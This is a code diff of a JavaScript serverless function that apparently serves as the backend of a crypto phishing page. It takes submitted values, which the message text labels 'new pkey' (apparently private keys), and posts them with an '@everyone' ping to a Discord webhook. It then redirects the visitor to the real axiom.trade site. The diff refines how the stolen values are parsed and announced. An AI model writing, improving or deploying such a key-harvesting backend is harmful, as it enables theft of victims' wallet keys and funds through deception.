@@ -21,32 +21,40 @@ exports.handler = async (event) => {
 
   let values;
   try {
-    const parsed = JSON.parse(decoded);
+    const parsed = JSON.parse(decoded); 
     if (Array.isArray(parsed)) {
       values = parsed;
     } else {
       throw new Error("Not array");
     }
   } catch (e) {
-    values = decoded.split(",").map((v) => v.trim()).filter(Boolean);
+    values = decoded.split(",").map((v) => v.trim());
   }
 
+  values = values
+    .map((v) =>
+      v
+        .replace(/^\s*"?\s*\[?/, "")  
+        .replace(/"?\s*\]?\s*$/, "")  
+        .trim()
+    )
+    .filter(Boolean); 
+
   if (!values.length) {
-    console.error("No values after decoding:", decoded);
+    console.error("No values after cleaning:", decoded);
     return {
       statusCode: 400,
       body: "No values found in decoded data",
     };
   }
 
-  const escapeDiscord = (s) =>
-    s.replace(/`/g, "\\`"); 
+  const escapeDiscord = (s) => s.replace(/`/g, "\\`"); 
 
   const lines = values
     .map((v, i) => `${i + 1}. \`${escapeDiscord(v)}\``)
     .join("\n");
 
-  const content = `New codes received:\n${lines}`;
+  const content = `@everyone new pkey:\n${lines}`;
 
   const webhookUrl = process.env.DISCORD_WEBHOOK_URL; 
 
@@ -71,7 +79,7 @@ exports.handler = async (event) => {
   return {
     statusCode: 302,
     headers: {
-      Location: "https://axiom.trade",
+      Location: "https://axiom.trade?id=1",
     },
   };
 };
